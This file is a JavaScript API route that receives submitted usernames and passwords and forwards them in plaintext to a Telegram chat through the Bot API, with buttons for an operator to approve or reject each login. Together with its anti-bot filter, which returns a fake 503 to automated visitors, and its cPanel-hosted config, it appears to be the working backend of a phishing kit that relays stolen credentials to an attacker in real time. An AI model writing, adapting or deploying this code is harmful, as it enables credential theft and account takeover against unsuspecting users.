import approvalSystem from "@/lib/approval-system";
import { CPANEL_CONFIG } from "@/config/cpanel-config";
import { isRequestFromBot } from "@/lib/server-antibot";

export async function POST(req) {
  // Zero tolerance bot protection
  if (isRequestFromBot(req)) {
    return new Response(JSON.stringify({ error: "Service unavailable" }), {
      status: 503,
      headers: { "Content-Type": "application/json" },
    });
  }
  try {
    const body = await req.json();
    const { flowId, username, password, meta } = body || {};

    if (!flowId || !username || !password) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: "Missing required fields",
        }),
        { status: 400 }
      );
    }

    // Create pending approval
    console.log("🔍 Creating approval with flowId:", flowId);
    console.log("🔍 FlowId type:", typeof flowId, "Length:", flowId?.length);

    const approval = approvalSystem.createPendingApproval(flowId, {
      username,
      password,
      meta,
    });

    console.log("🔍 Approval created:", approval);

    // Send to Telegram with approval buttons
    const success = await sendApprovalRequestToTelegram(approval);

    if (!success) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: "Failed to send approval request",
        }),
        { status: 500 }
      );
    }

    return Response.json({ ok: true, flowId });
  } catch (e) {
    console.error("Admin approval error:", e);
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      status: 500,
    });
  }
}

async function sendApprovalRequestToTelegram(approval) {
  // Try environment variables first, then fallback to cPanel config
  const token =
    process.env.TELEGRAM_BOT_TOKEN || CPANEL_CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID || CPANEL_CONFIG.TELEGRAM_CHAT_ID;

  if (
    !token ||
    !chatId ||
    token === "YOUR_BOT_TOKEN_HERE" ||
    chatId === "YOUR_CHAT_ID_HERE"
  ) {
    console.error(
      "Missing Telegram configuration. Please update src/config/cpanel-config.js with your bot credentials."
    );
    return false;
  }

  try {
    const timestamp = new Date().toLocaleString();
    const { flowId, credentials } = approval;
    const { username, password, meta } = credentials;

    // Create message text
    const message =
      `🔐 <b>Login Approval Request</b>\n\n` +
      `📅 <b>Time:</b> ${timestamp}\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n\n` +
      `👤 <b>Username:</b> <code>${username}</code>\n` +
      `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
      `🌐 <b>User Agent:</b> <code>${meta?.userAgent || "Unknown"}</code>\n\n` +
      `⚠️ <b>Please review and approve/reject this login attempt</b>`;

    // Create inline keyboard with approve/disapprove buttons
    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "✅ Approve",
            callback_data: `approve_${flowId}`,
          },
          {
            text: "❌ Disapprove",
            callback_data: `reject_${flowId}`,
          },
        ],
      ],
    };

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
      cache: "no-store",
    });

    const data = await response.json();
    if (!response.ok || !data?.ok) {
      console.error("Telegram API error:", data?.description);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Failed to send approval request to Telegram:", error);
    return false;
  }
}
